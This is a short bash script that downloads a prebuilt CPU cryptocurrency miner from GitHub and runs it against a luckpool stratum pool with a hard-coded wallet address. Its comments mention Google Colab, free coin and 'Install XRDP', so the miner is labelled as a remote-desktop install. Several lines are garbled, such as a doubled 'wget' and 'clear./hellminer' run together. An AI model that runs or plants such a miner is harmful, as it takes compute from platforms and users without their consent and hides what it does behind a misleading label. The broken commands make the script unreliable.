#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
sudo apt install screen
screen -R verus


wget wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
clear./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLjLZBYdLSqJkV3EF1fcuo1fQhzFAGgRog.Rosy -p x --cpu 2
